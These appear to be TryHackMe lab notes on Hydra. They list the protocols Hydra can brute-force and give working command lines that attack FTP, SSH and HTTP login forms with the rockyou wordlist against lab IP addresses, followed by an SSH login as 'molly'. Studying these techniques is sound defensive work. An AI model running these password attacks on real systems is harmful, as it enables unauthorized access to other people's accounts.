# THM - Hydra

Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, 
FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, 
HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, 
PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, 
Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.

```shell
hydra -l user -P passlist.txt ftp://10.10.33.240

hydra -l <username> -P <full path to pass> 10.10.33.240 -t 4 ssh

hydra -l <username> -P <wordlist> 10.10.33.240 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V


hydra -l molly -P ../../Materials/KaliWordlists/rockyou.txt 10.10.154.209 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

hydra -l molly -P ../../Materials/KaliWordlists/rockyou.txt 10.10.154.209 ssh

ssh molly@10.10.154.209	
```
